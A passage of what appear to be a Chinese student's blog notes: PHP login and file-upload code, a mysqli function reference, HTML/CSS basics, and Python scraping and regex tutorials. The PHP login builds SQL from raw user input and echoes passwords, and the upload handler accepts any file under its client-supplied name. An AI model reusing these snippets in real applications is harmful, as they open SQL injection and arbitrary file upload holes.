$sql = &quot;select * from users where username = &#x27;$u&#x27; and password = &#x27;$p&#x27;&quot;; $result = mysqli_query($link, $sql); //在mysql的变量$link里面执行$sql命令 $row = mysqli_fetch_array($result); //mysqli_fetch_array 接受一个结果对象作为参数，检索给定结果对象中当前行的内容，并将其作为关联数组或数值数组返回。 if ($row) &#123; echo &#x27;Your Login name:&#x27; . $row[&#x27;username&#x27;]; echo &#x27;Your password:&#x27; . $row[&#x27;password&#x27;]; &#125; else echo &#x27;None&#x27;;&#125;?&gt; 打开网站 输入账号密码，实现交互 文件的简单上传 12345678910111213141516171819202122232425262728293031&lt;?php//输入文件上传框echo &#x27;&lt;form action=&quot;&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;&lt;label for=&quot;upload&quot;&gt;上传你的头像&lt;/label&gt;&lt;input name=&quot;file&quot; id=&quot;upload&quot; type=&quot;file&quot; &gt;&lt;label for=&quot;submit&quot; &gt;文件上传&lt;/label&gt;&lt;input name=&quot;submit&quot; id=&quot;submit&quot; type=&quot;submit&quot;&gt;&lt;h1&gt;下面是接收到的文件&lt;/h1&gt;&lt;/form&gt;&#x27;;header(&#x27;Content-Type: text/html; charset=utf-8&#x27;);//定位到text/htmlif(isset($_FILES[&quot;file&quot;]))&#123;//如果有这个文件 $upload_dir = &quot;uploads&quot;; $file_name = $_FILES[&quot;file&quot;][&quot;name&quot;]; $file_type = $_FILES[&quot;file&quot;][&quot;type&quot;]; $file_size = $_FILES[&quot;file&quot;][&quot;size&quot;]; $file_tmp = $_FILES[&quot;file&quot;][&quot;tmp_name&quot;]; $target_path = $upload_dir.&#x27;/&#x27;.$file_name; if (move_uploaded_file($file_tmp, $target_path))&#123; echo &quot;上传成功&quot;.&quot;&lt;br&gt;&quot;; echo &quot;文件类型: &quot; . $file_type . &quot;&lt;br&gt;&quot;; echo &quot;文件大小: &quot; . ($file_size / 1024) . &quot; kB&lt;br&gt;&quot;; echo &quot;文件存储的位置: &quot; . $target_path; &#125;else&#123; echo &quot;上传失败&quot;.&quot;&lt;br&gt;&quot;; &#125; echo &quot;&lt;br/&gt;&quot;;echo &quot;&lt;img src=&#x27;./$target_path.&#x27;&gt;&quot;;&#125;?&gt; php和mysli的连接一般函数以下是一些常见的 PHP MySQLi 函数及其参数和用法： mysqli_affected_rows($link)返回上一次 MySQL 操作所影响的记录行数。$link 是一个 MySQL 连接。 1234$con = mysqli_connect(&quot;localhost&quot;, &quot;username&quot;, &quot;password&quot;, &quot;database&quot;);mysqli_query($con, &quot;DELETE FROM table_name WHERE condition&quot;);echo &quot;受影响的行数: &quot; . mysqli_affected_rows($con);mysqli_close($con); mysqli_autocommit($link, $mode)打开或关闭自动提交数据库修改。$link 是一个 MySQL 连接，$mode 是一个布尔值，如果设置为 TRUE，打开自动提交；如果设置为 FALSE，关闭自动提交。 12345$con = mysqli_connect(&quot;localhost&quot;, &quot;username&quot;, &quot;password&quot;, &quot;database&quot;);mysqli_autocommit($con, FALSE);mysqli_query($con, &quot;INSERT INTO table_name (column1, column2) VALUES (value1, value2)&quot;);mysqli_commit($con);mysqli_close($con); mysqli_change_user($link, $username, $password, $database)更改指定数据库连接的用户。$link 是一个 MySQL 连接，$username 是一个字符串，表示 MySQL 用户名，$password 是一个字符串，表示 MySQL 密码，$database 是一个字符串，表示 MySQL 数据库名。 12$con = mysqli_connect(&quot;localhost&quot;, &quot;username&quot;, &quot;password&quot;, &quot;database&quot;);mysqli_change_user($con, &quot;new_username&quot;, &quot;new_password&quot;, &quot;new_database&quot;); mysqli_character_set_name($link)返回数据库连接的默认字符集。$link 是一个 MySQL 连接。 123$con = mysqli_connect(&quot;localhost&quot;, &quot;username&quot;, &quot;password&quot;, &quot;database&quot;);echo &quot;默认字符集: &quot; . mysqli_character_set_name($con);mysqli_close($con); mysqli_close($link)关闭先前打开的数据库连接。$link 是一个 MySQL 连接。 12$con = mysqli_connect(&quot;localhost&quot;, &quot;username&quot;, &quot;password&quot;, &quot;database&quot;);mysqli_close($con); mysqli_connect($hostname, $username, $password, $database, $port, $socket)打开一个到 MySQL 服务器的新的连接。$hostname 是一个字符串，表示 MySQL 服务器的主机名，$username 是一个字符串，表示 MySQL 用户名，$password 是一个字符串，表示 MySQL 密码，$database 是一个字符串，表示 MySQL 数据库名，$port 是一个整数，表示 MySQL 服务器的端口号，$socket 是一个字符串，表示 MySQL 服务器的套接字或命名管道。 123456$con = mysqli_connect(&quot;localhost&quot;, &quot;username&quot;, &quot;password&quot;, &quot;database&quot;);if (!$con) &#123; die(&quot;连接失败: &quot; . mysqli_connect_error());&#125;echo &quot;连接成功&quot;;mysqli_close($con);","categories":[{"name":"上课笔记","slug":"上课笔记","permalink":"http://zhoumuyun.com/categories/%E4%B8%8A%E8%AF%BE%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"PHP配置和交互","slug":"PHP配置和交互","permalink":"http://zhoumuyun.com/tags/PHP%E9%85%8D%E7%BD%AE%E5%92%8C%E4%BA%A4%E4%BA%92/"}]},{"title":"html和css的基础知识","slug":"html和css的基础知识","date":"2023-12-10T01:18:45.000Z","updated":"2023-12-10T02:12:50.192Z","comments":true,"path":"2023/12/10/html和css的基础知识/","link":"","permalink":"http://zhoumuyun.com/2023/12/10/html%E5%92%8Ccss%E7%9A%84%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/","excerpt":"此篇介绍了css的盒子模型,HTML的基本元素,css和html的结合等基础知识","text":"此篇介绍了css的盒子模型,HTML的基本元素,css和html的结合等基础知识 盒模型示意图： 盒模型的组成部分：内容区域（Content）：内容区域是元素实际包含内容的区域，例如文本、图像或其他子元素。这个区域的大小可以通过设置 width 和 height 属性来控制 内边距（Padding）：内边距是内容区域与边框之间的区域。它提供了一种方法来控制内容与边框之间的空间。可以使用 padding 属性来设置内边距的大小 边框（Border）：边框是围绕在内边距外部的区域，用于包围元素内容。可以使用 border 属性来定义边框的宽度、样式和颜色 外边距（Margin）：外边距是元素与其他元素之间的空白区域。它用于控制元素与周围元素之间的距离。可以使用 margin 属性来设置外边距的大小 模型的计算方式：content Width&#x2F;Height（内容宽度&#x2F;高度）：由 width 和 height 属性设置，表示内容区域的大小 padding（内边距）：在内容区域和边框之间。例如：padding: 10px; 表示内边距为 10 像素 border（边框）：包围在内边距外部。例如：border: 1px solid #000; 表示边框为 1 像素的黑色实线 Margin（外边距）：元素与周围元素之间的空白区域。例如：margin: 20px; 表示外边距为 20 像素 HTML的基本元素 css的配置颜色和背景color: 设置文本颜色 background-color: 设置背景颜色 background-image: 设置背景图片 opacity: 设置元素的透明度 盒模型width 和 height: 设置元素的宽度和高度 margin: 设置元素的外边距 padding: 设置元素的内边距 border: 设置元素的边框 布局和定位display: 设置元素的显示方式（如 block、inline、flex 等） position: 控制元素的定位方式（如 static、relative、absolute、fixed 等） float: 允许元素在左侧或右侧浮动 文本排版font-family: 设置字体族名称 font-size: 设置字体大小 font-weight: 设置字体粗细 text-align: 设置文本水平对齐方式 line-height: 设置行高 装饰性样式text-decoration: 设置文本修饰（如下划线、删除线等） border-radius: 设置元素边角的圆角半径 box-shadow: 添加阴影效果 动画和过渡animation: 设置元素的动画效果 transition: 设置元素样式的过渡效果 响应式设计@media: 媒体查询，根据不同的设备尺寸或特性应用不同的 CSS 样式 CSS 属性可以通过不同的方式在 HTML 元素中使用内联样式（Inline Styles）: 内部样式表（Internal Styles） 外部样式表（External Styles） 以上方法中，使用 CSS 属性时需要注意以下几点:属性名和值之间使用冒号 : 分隔，属性值需要用分号 ; 结尾 多个样式属性可以用分号 ; 分隔开 在规则集中定义的选择器（如 p、.class、#id 等）决定了哪些 HTML 元素会受到这些样式的影响。这些方法使得你可以根据需要，选择合适的方式来应用 CSS 属性，以控制 HTML 元素的外观和布局。","categories":[{"name":"前端笔记","slug":"前端笔记","permalink":"http://zhoumuyun.com/categories/%E5%89%8D%E7%AB%AF%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"笔记","slug":"笔记","permalink":"http://zhoumuyun.com/tags/%E7%AC%94%E8%AE%B0/"}]},{"title":"数据解析模块","slug":"数据解析模块","date":"2023-12-09T12:53:59.000Z","updated":"2023-12-25T03:08:55.837Z","comments":true,"path":"2023/12/09/数据解析模块/","link":"","permalink":"http://zhoumuyun.com/2023/12/09/%E6%95%B0%E6%8D%AE%E8%A7%A3%E6%9E%90%E6%A8%A1%E5%9D%97/","excerpt":"此篇介绍了bs模块和xpath模块","text":"此篇介绍了bs模块和xpath模块 BS4解析1234567891011121314151617181920212223from bs4 import BeautifulSouphtml = &quot;&quot;&quot; &lt;ul&gt; &lt;li&gt;&lt;a href=&quot;zhangwuji&quot;&gt;张无忌&lt;/a&gt;&lt;/li&gt; &lt;li id=&quot;abc&quot;&gt;&lt;a href=&quot;zhouxingchi.com&quot;&gt;周星驰&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;zhubaji.com&quot;&gt;猪八戒&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;wuzetian.com&quot;&gt;武则天&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt;&quot;&quot;&quot;page = BeautifulSoup(html, &#x27;html.parser&#x27;)page.find(&quot;标签名&quot;,attr=&#123;&quot;属性&quot;:&quot;属性值&quot;&#125;)#查找某个元素，只会找到一个结果page.find_all(&quot;标签名&quot;,attr=&#123;&quot;属性&quot;:&quot;属性值&quot;&#125;) #会找到一堆结果li = page.find_all(&quot;标签名&quot;,attr=&#123;&quot;属性&quot;:&quot;属性值&quot;&#125;)a =li.find_all(&quot;a&quot;)print(a.text)print(a.get(&#x27;href&#x27;))li_list = page.find_all(&quot;li&quot;)for li in li_list: a = li.find(&quot;a&quot;) print(a.text) print(a.get(&#x27;href&#x27;)) Xpathxpath是一门XML文档中查找信息的语言，XPath可用来在XML文档中对元素和属性进行遍历，而我们熟知的HTML恰巧属于XML的一个子集，所以完全可以用xpath去查找HTML中的元素 123456789&lt;book&gt; &lt;id&gt;1&lt;/id&gt; &lt;name&gt;野花遍地&lt;/name&gt; &lt;price&gt;19.99&lt;/price&gt; &lt;author&gt; &lt;nick&gt;周杰伦&lt;/nick&gt; &lt;nick&gt;周星驰&lt;/nick&gt; &lt;/author&gt;&lt;/book&gt; 在上述html中 节点的介绍1，book,id,name,price….都被称作为节点 2，id,name,price,author都被称book的子节点 3，book被id,name,price,author称作为父节点 4，id,name,price,author被称为同胞节点 xpath的运用例子result &#x3D; et.xpath(“&#x2F;book”) #表示根节点 reslut &#x3D; et.path(“book&#x2F;name”) #在Xpth中间的&#x2F;表示是儿子 reslut &#x3D; et.path(“book&#x2F;name&#x2F;text()”)[0] #text()拿文本 reslut &#x3D; et.path(“book&#x2F;&#x2F;nick”) # &#x2F;&#x2F; 表示的是子孙后代 *reslut &#x3D; et.path(“book&#x2F;&#x2F;nick&#x2F;text()”) # 通配符 谁都行* reslut &#x3D; et.path(“book&#x2F;author&#x2F;nick[@class&#x3D;”jay”]&#x2F;text()”) # []表示属性筛选，@属性名 &#x3D; 值 reslut &#x3D; et.path(“book&#x2F;partner&#x2F;nick&#x2F;@id”) #最后一个&#x2F;表示拿到nick里面id的内容，@属性，可以直接拿到属性值 li_list &#x3D; et.xpath(“html&#x2F;body&#x2F;ul&#x2F;li”) #得到是一个列表 li_list &#x3D; et.xpath(“html&#x2F;body&#x2F;ul&#x2F;li[]”) #可以在后面直接中括号定位 li_list &#x3D; et.xpath(“&#x2F;&#x2F;li”) #可以拿到很多li for li in li_list: li.xpath(“.&#x2F;“) #.&#x2F;相对 表示当前的节点，这里的.&#x2F;就是li li.xpath(“.&#x2F;a&#x2F;@href”) #想要href ，只写href,不写属性，就是拿取属性 li.xpath(“.&#x2F;a&#x2F;text()”) #想要文本 pyqueryPyQuery(选择器)p &#x3D; PuQuery(html) 将html内容放进PyQuery里面初始化 1234567a = p(&quot;a&quot;) # 打印a标签，括号加上选择器就能直接提取# a还是pyquery对象，可以进一步提取a = p(&quot;li&quot;)(&quot;a&quot;) # 找到li标签下的a标签，链式操作a = p(&quot;.aaa&quot;) # css类选择器，.是选择classprint(a)a = p(&quot;#qq&quot;) # css id 选择器，#是选择idprint(a) 后代选择器空格就是后代选择器12# 后代选择器a = p(&quot;li a&quot;) # 找到li标签下的所有a标签,a是li的后代，直接接上空格就可以 .items()当选择器的内容很多的时候，需要一个一个处理的时候 a &#x3D; p(“li a”).attr(“href”) 只能拿到第一项数据 多个标签 拿属性，用迭代器,用items()方法 it &#x3D; p(“li a”).items() 得到一个生成器 1234for item in it: href = item.attr(&quot;href&quot;) # 拿到hrefde属性 text = item.text() # 拿到文本 print(href, text) attr(属性名):拿到属性的值加值就是修改或者添加 不加值就是查询 attr可以修改，增加属性 12p(&quot;div.bbb&quot;).attr(&quot;class&quot;,&quot;aaa&quot;) #将他的class属性改成aaap(&quot;div.aaa&quot;).attr(&quot;id&quot;,&quot;123456&quot;) #当他的属性里面没有的，attr可以添加属性 text() 拿到文本123456div = &quot;&quot;&quot; &lt;div&gt;&lt;span&gt;我爱你&lt;/span&gt;&lt;/div&gt;&quot;&quot;&quot;p = PyQuery(div)html = p(&quot;div&quot;).html() # 标签里面的所有内容，包括html代码text = p(&quot;div&quot;).text() # 标签里面的文本内容，只有文本内容 PyQuery还能进行增删改查的作用123456789101112131415html = &quot;&quot;&quot; &lt;div class= &quot;aaa&quot;&gt;哒哒哒啊啊&lt;/div&gt; &lt;div class= &quot;bbb&quot;&gt;嘟嘟嘟&lt;/div&gt; &quot;&quot;&quot;p = PyQuery(html)p(&quot;div.aaa&quot;).after(&quot;&lt;div class=&#x27;aaa&#x27;&gt;after&lt;/div&gt;&quot;) 增 #在div后面添加,在外部添加p(&quot;div.bbb&quot;).append(&quot;&lt;div class=&#x27;bbb&#x27;&gt;append&lt;/div&gt;&quot;) #在div里面添加，在内部添加p(&quot;div.bbb&quot;).attr(&quot;class&quot;,&quot;aaa&quot;) #将他的class属性改成aaa 改p(&quot;div.aaa&quot;).attr(&quot;id&quot;,&quot;123456&quot;) #当他的属性里面没有的，attr可以添加属性p(&quot;div.aaa&quot;).remove_attr(&quot;id&quot;) #删除id属性p(&quot;div.aaa&quot;).remove() #删除标签 删 123456789101112131415161718192021222324252627282930313233343536from selenium import webdriverfrom pyquery import PyQuerydef get_page_soure(url): # 获取页面源码 # 创建web实例 driver = webdriver.Chrome() driver.get(url) # 获取网页源代码 html = driver.page_source # 将源代码赋给html html.encode(&#x27;utf-8&#x27;) # 将编码统一 # print(html) driver.quit() # 关闭浏览器 return html # 返回html的值# 想要在已经提取的内容里面获取第一个怎么办? eq(0) eq()在已经提取的内容里面获取想要的内容# nth-child(1) 在css选择的时候，选取第一个的位置def parse_page_soure(html): # 解析页面源码 doc = PyQuery(html) # 将页面源码交给PyQuery解析 docs = doc(&quot;.list_list_con__h7GvV&quot;)(&quot;.clearfix&quot;).items() # 将解析后的源码进行筛选，得到了一个带有信息的列表 for item in docs: # 将列表循环 Km = item(&quot;li &gt; div &gt; ul &gt; li&quot;).text() # 用PyQuery筛选出我们要的信息 print(Km)def main(): url = &quot;https://k.autohome.com.cn/146#pvareaid=3454440&quot; # 1.提取页面源代码 html = get_page_soure(url) # 2,解析页码代码，提取数据 parse_page_soure(html)if __name__ == &#x27;__main__&#x27;: main()","categories":[{"name":"python笔记","slug":"python笔记","permalink":"http://zhoumuyun.com/categories/python%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"笔记","slug":"笔记","permalink":"http://zhoumuyun.com/tags/%E7%AC%94%E8%AE%B0/"}]},{"title":"爬虫的一些实例","slug":"爬虫的一些实例","date":"2023-12-09T11:39:06.000Z","updated":"2023-12-09T11:54:16.643Z","comments":true,"path":"2023/12/09/爬虫的一些实例/","link":"","permalink":"http://zhoumuyun.com/2023/12/09/%E7%88%AC%E8%99%AB%E7%9A%84%E4%B8%80%E4%BA%9B%E5%AE%9E%E4%BE%8B/","excerpt":"此篇介绍了爬虫的一些实例，暂时有：豆瓣TOP250的电影信息，电影天堂的下载地址，爬取一些网站的图片","text":"此篇介绍了爬虫的一些实例，暂时有：豆瓣TOP250的电影信息，电影天堂的下载地址，爬取一些网站的图片 爬取豆瓣TOP250的电影信息用了for循环迭代每一页的数据，用header解决一些反爬措施，用正则表达式去匹配 123456789101112131415import reimport requestsfor i in range(0,250,25): #爬取每一页25个数据 url = f&quot;https://movie.douban.com/top250/&#123;i&#125;&quot; header = &#123; &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36&quot;&#125; res = requests.get(url, headers=header) #发送给豆瓣的获取的相应包 pagesoure = res.text #查看源代码 # print(pagesoure) obj = re.compile(r&#x27;&lt;div class=&quot;item&quot;&gt;.*?&lt;span class=&quot;title&quot;&gt;(?P&lt;name&gt;.*?)&lt;/span&gt;&#x27;, re.S) #预加载，获取正则表达式 result = obj.finditer(pagesoure)#用正则表达式去匹配网页源代码，获得的一个带有数据的迭代器 for item in result: print(item.group(&quot;name&quot;))#迭代输出元素，用group来获取数据 爬取电影天堂下载地址用来正则表达式预加载，用finditer迭代出每个网站的子域名，然后进行拼接爬取 12345678910111213141516171819202122232425262728293031323334import reimport requestsurl = &quot;https://www.dy2018.com/&quot;resp = requests.get(url)resp.encoding = &quot;gbk&quot; # 统一编码obj1 = re.compile(r&quot;2023必看热片.*?&lt;ul&gt;(?P&lt;html&gt;.*?)&lt;/ul&gt;&quot;, re.S)# 使用正则规则result1 = obj1.search(resp.text)# 在一个页面只提取一次，用searchhtml = result1.group(&quot;html&quot;)# 将提取的数据用group包装obj2 = re.compile(&quot;&lt;li&gt;&lt;a href=&#x27;(?P&lt;href&gt;.*?)&#x27; title&quot;)# 匹配收到的页面数据result2 = obj2.finditer(html)# 将匹配的数据放进迭代器for item in result2: child_url = url.strip(&quot;/&quot;) + item.group(&quot;href&quot;) # 拼接出子页面的地址 chile_resp = requests.get(child_url) # 发送子页面的请求包 chile_resp.encoding = &quot;gbk&quot; # 将获取到的数据统一编码 # print(chile_resp.text) obj3 = re.compile(r&#x27;class=&quot;position&quot;.*?◎片 名 (?P&lt;name&gt;.*?)&lt;br /&gt;.*?&lt;td style=&quot;WORD-WRAP: break-word&quot; bgcolor=&quot;#fdfddf&quot;&gt;&lt;a href=&quot;(?P&lt;zhongzi&gt;.*?)&quot;&gt;&#x27;, re.S) # 匹配正则规则 result3 = obj3.search(chile_resp.text) # 这里用search,每个页面的只匹配一次 print(result3.group(&quot;name&quot;)) # 将匹配的名字和下载地址包装输出 print(result3.group(&quot;zhongzi&quot;)) 如果在正则里面想要使用变量，就要使用下面这种形式 custom_text &#x3D; “2023新片精品” {re.escape(custom_text)} pattern &#x3D; re.compile(fr”{re.escape(custom_text)}.?(?P.?)“, re.S) 12345678910111213141516171819202122import requestsimport reurl = &quot;https://www.dytt8.com/&quot;resp = requests.get(url)resp.encoding = &quot;gbk&quot;# print(resp.text)obj1 = re.compile(r&#x27;新片精品.*?&lt;/tr&gt;(?P&lt;html&gt;.*?)&lt;/table&gt;&#x27;, re.S)results = obj1.search(resp.text)html = results.group(&quot;html&quot;)obj2 = re.compile(r&quot;&lt;a href=&#x27;(?P&lt;mulu&gt;.*?)&#x27;&gt;&quot;)result1 = obj2.finditer(html)for item in result1: new_url = url.strip(&quot;/&quot;) + item.group(&quot;mulu&quot;) print(new_url) new_html = requests.get(new_url) new_html.encoding = &quot;gbk&quot; obj3 = re.compile(r&#x27;id=&quot;Zoom&quot;.*?◎片 名 (?P&lt;name&gt;.*?)&lt;br /&gt;.*?&lt;a target=&quot;_blank&quot; href=&quot;(?P&lt;zhongzi&gt;.*?)&quot;&gt;&#x27;, re.S) resp2 = obj3.search(new_html.text) print(resp2.group(&quot;name&quot;)) print(resp2.group(&quot;zhongzi&quot;)) 爬取网站的图片用bs4解析网站源码，用来find_all()方法和find方法 page.find(“标签名”,attr&#x3D;{“属性”:”属性值”}) #查找某个元素，只会找到一个结果page.find_all(“标签名”,attr&#x3D;{“属性”:”属性值”}) #会找到一堆结果 12345678910111213141516171819202122232425262728293031import requestsfrom bs4 import BeautifulSoup as bfsn = 1 #图片名称url = &quot;https://www.umei.net/&quot;res = requests.get(url)res.encoding = &#x27;utf-8&#x27; # 设置编码main_page = bfs(res.text, &#x27;html.parser&#x27;) # 用html.parser来解析a_list = main_page.find_all(&quot;li&quot;, attrs=&#123;&quot;class&quot;: &quot;i_list list_n2&quot;&#125;) # 找到所有li标签，并指定class为i_list list_n2值的数据print(len(a_list))for i in a_list: img = i.find(&quot;img&quot;).get(&quot;data-original&quot;) #父链接的图片 href = i.find(&quot;a&quot;).get(&quot;href&quot;) # 找到a标签的href属性 new_url = url.strip(&quot;/&quot;) + href # 去除网站的/,方便和href连接 &quot;&quot;&quot; 注意： 子页面的url如果开头是/，直接在前面加上域名就可以了 子页面的url如果开头不是/，此时需要是找到主页面的url，去掉最后一个/后面的内容和当前的url进行拼接 &quot;&quot;&quot; res1 = requests.get(new_url) #获取子连接的请求包 res1.encoding = &#x27;UTF-8&#x27; # 设置编码 new_page = bfs(res1.text, &quot;html.parser&quot;)#用html.parser来解析子链接 div = new_page.find(&quot;div&quot;, attrs=&#123;&quot;class&quot;: &quot;image_div&quot;&#125;) # 找到div标签，并指定class为image_div值的数据 img1_src = div.find(&quot;img&quot;).get(&quot;src&quot;) # 找到img标签，并获取src属性值 print(img1_src) #下载图片 img_rsps = requests.get(img1_src) #发送图片请求包 with open(f&quot;&#123;n&#125;.jpg&quot;,mode=&quot;wb&quot;) as f: #打开一个文件，注意此时写入文件的是字节，所以必须是wb f.write(img_rsps.content)#把图片信息写入到文件中 n+=1res.close()print(&quot;爬取成功&quot;)","categories":[{"name":"python笔记","slug":"python笔记","permalink":"http://zhoumuyun.com/categories/python%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"笔记","slug":"笔记","permalink":"http://zhoumuyun.com/tags/%E7%AC%94%E8%AE%B0/"}]},{"title":"爬虫的相关库和相关原理","slug":"爬虫的相关库和相关原理","date":"2023-12-09T11:26:41.000Z","updated":"2023-12-09T11:35:11.148Z","comments":true,"path":"2023/12/09/爬虫的相关库和相关原理/","link":"","permalink":"http://zhoumuyun.com/2023/12/09/%E7%88%AC%E8%99%AB%E7%9A%84%E7%9B%B8%E5%85%B3%E5%BA%93%E5%92%8C%E7%9B%B8%E5%85%B3%E5%8E%9F%E7%90%86/","excerpt":"此篇介绍了爬虫的相关库和相关原理。HTTP协议和request模块（findall，finditer，search，match，re.compile，group(“名字”),re.S)，和re正则表达式，","text":"此篇介绍了爬虫的相关库和相关原理。HTTP协议和request模块（findall，finditer，search，match，re.compile，group(“名字”),re.S)，和re正则表达式， HTTP协议HTTP把一条信息分为三大块内容，无论请求还是相应都是三块内容 请求： 1， 请求行 -&gt; 请求 方式（get,post） 请求url地址（协议） 2，请求头 -&gt; 放一些服务器要使用的附加信息 3，请求体 -&gt; 一般放一些请求参数 相应： 1，状态行 -&gt; 协议 状态码 2，响应头 -&gt; 放一些客户端要使用的一些附加信息 3，响应体 -&gt; 服务器返回的真正客户端要用的内容（HTML，json等） request模块简单调用 123456import requests#爬取百度的页面源代码url = &quot;http://www.baidu.com&quot;res = requests.get(url)res.encoding = &quot;utf-8&quot;print(res.text)#拿到页面源代码 get请求 12345678910import requestscontent = input(&quot;请输入你要检索的内容: &quot;)url = f&quot;https://www.sougou.com/web?query=&#123;content&#125;&quot;headers = &#123; &quot;User-Agent:&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36&quot;&#125;#添加请求头伪装res = requests.get(url,headers=headers)print(res.text) post请求 12345678910111213141516import requestsurl = &quot;https://fanyi.baidu.com/sug&quot;data = &#123; &quot;kw&quot; : input(&quot;请输入你想翻译的单词&quot;)&#125;res = requests.post(url,data=data)print(res.json()) #此时拿到的是json数据data = &#123;&quot;type&quot;: &quot;13&quot;,&quot;interval_id&quot;: &quot;100:90&quot;,&quot;action&quot;:&quot;&quot; ,&quot;start&quot;: &quot;0&quot;,&quot;limit&quot;: &quot;20&quot; 爬取多个参数 123456789101112131415161718import requestsurl = &quot;https://movie.douban.com/j/chart/top_list&quot;data = &#123; &quot;type&quot;: &quot;13&quot;, &quot;interval_id&quot;: &quot;100:90&quot;, &quot;action&quot;: &quot;&quot;, &quot;start&quot;: &quot;0&quot;, &quot;limit&quot;: &quot;20&quot;&#125;#这个就是url的“ ？”后的数据header = &#123; &quot;User-Agent&quot;:&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.3&quot;&#125;rest = requests.get(url,params=data,headers=header)print(rest.request.url) re正则表达式一种使用表达式的方式对字符串进行匹配的语法规则 我们抓取道德网页源码啊本质上是一个超长的字符串 正则的优点：速度快，效率高，准确性高 . 匹配除了换行符以外的任意字符，未来在python的re模块中是一个坑 \\w 匹配字母或者数字下划线 匹配3个就 \\w\\w\\w \\s 匹配任意的空白符 匹配多少个就输入多少次 \\d 匹配数字 \\n 匹配一个换行符 \\t 匹配一个制表符 ^ 匹配字符串的开始 ^18692930701$匹配电话号码 $ 匹配字符串的结尾 \\W 匹配非字母和数字下滑线 \\D 匹配非数字 \\S 匹配非空白符 a|b 匹配字符a或字符b () 匹配括号内的表达式，也表示一个组 […] 匹配字符组中的字符，{abcde] 匹配a,b,c,d,e, [a-zA-Z0-9] 匹配数字字母 [^…] 匹配除了字符组中字符的所有字符 类似于上面的取反 量词：控制前面的元字符出现的次数，尽可能往多了去匹配 *** 重复0次或者更多次** + 重复一次或更多次 连续的一串 ？ 重复0次或者一次 最多匹配一次 {n} 重复n次 {n,} 重复n次或者更多次 {n,m} 重复n到m次 贪婪匹配和惰性匹配： . 贪婪匹配 尽可能多的拿到结果* .*? 惰性匹配 尽可能少的去匹配结果 回溯 re模块**findall：从页面里面提取怎么样的参数 ** 123import reresult = re.findall(r&quot;\\d+&quot;,&quot;我是一个33333abcde4444fg&quot;) #\\一般是转义字符，要用正则表达式一般要在引号前面加上rprint(result)#输出33333 4444 finditer：这是重点，涉及迭代器 12345import reresult = re.finiter(r&quot;\\d+&quot;,&quot;我是一个33333abcde4444fg&quot;) #\\一般是转义字符，要用正则表达式一般要在引号前面加上rprint(result)#得到了一个迭代器for item in result: print(item.group())#从匹配的结果拿到数据 search只会匹配到第一次匹配的内容 123456import re#search只会匹配到第一次匹配的内容result = re.search(r&quot;\\d+&quot;,&quot;我叫周杰伦，今年45岁，我的班级是3年3班&quot;)#print(result)#得到的是一个match对象#加上group()方法print(result.group()) match，在匹配的时候，是从字符串的开头进行匹配的，类似在正则前面加上了^ 12res = re.match(r&quot;\\d+&quot;,&quot;我叫周杰伦，今年32岁，我的班级是五年四班&quot;)print(res) 预加载，提前把正则对象加载完毕 1234obj = re.compile(r&quot;\\d+&quot;)#先加载正则表达式，减少内存result = obj.findall(&quot;我叫周杰伦，今年32岁，我的班级是五年四班&quot;)print(result) 想要提取数据必须要用小括号括起来，可以单独取名字 (?p&lt;名字&gt;正则) 提取数据的时候需要group(“名字”) 12345678910111213141516#一段数据s = &quot;&quot;&quot;&lt;div class = &#x27;西游记&#x27;&gt;&lt;span id = &#x27;10010&#x27;&gt;中国联通&lt;/span&gt;&lt;/div&gt;&lt;div class = &#x27;西游记&#x27;&gt;&lt;span id = &#x27;10086&#x27;&gt;中国移动&lt;/span&gt;&lt;/div&gt;&quot;&quot;&quot;#(?p&lt;dianhua&gt;&#x27;\\d+&#x27;),取这里一段连续的数字，()将他们分成一个列表，？p&lt;name&gt;将这段数据取一个名字#(?p&lt;yunyingshang&gt;.*? .*?匹配汉字只能使用&#x27;.&#x27;,这里用的是惰性匹配，尽可能少的匹配，obj = re.complile(r&quot;&lt;span id = (?p&lt;dianhua&gt;&#x27;\\d+&#x27;)&gt;(?p&lt;yunyingshang&gt;.*?)&lt;/span&gt;&lt;/div&gt;&quot;)res = obj.finditer(s)#将匹配数据整合成一个迭代器for item in result: id = item.group(&quot;dianhua&quot;) #迭代器用group()方法显示数据 prine(id) phont = item.group(&quot;yunyingshang&quot;) print(phone) re.S 这个是重点，每次记得加上 ，可以匹配换行符，弥补正则的不足 123456789101112131415161718192021222324252627import reimport requestsf = open(&quot;top250.csv&quot;, mode=&quot;w&quot;, encoding=&quot;utf-8&quot;)for i in range(0, 250, 25): # 每个页面是25个数据，要循环到250个 url = f&quot;https://movie.douban.com/top250?start=&#123;i&#125;&amp;filter=&quot; # 这里i在网页中是一个变量，控制着网页的内容 header = &#123; # 伪装 &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36&quot;&#125; res = requests.get(url, headers=header) pagesoure = res.text # 将爬取的页面存放成一个对象 # print(pagesoure) obj = re.compile(r&#x27;&lt;div class=&quot;item&quot;&gt;.*?&lt;span class=&quot;title&quot;&gt;(?P&lt;name&gt;.*?)&lt;/span&gt;.*?&lt;p class=&quot;&quot;&gt;.*?&#x27; r&#x27;导演: (?P&lt;daoyan&gt;.*?)&amp;nbsp;.*?&lt;br&gt;(?P&lt;year&gt;.*?)&amp;nbsp;.*?&lt;span class=&quot;rating_num&quot; property=&quot;v:average&quot;&gt;&#x27; r&#x27;(?P&lt;score&gt;.*?)&lt;/span&gt;.*?&lt;span&gt;(?P&lt;con&gt;.*?)人评价&lt;/span&gt;&#x27;, re.S) # 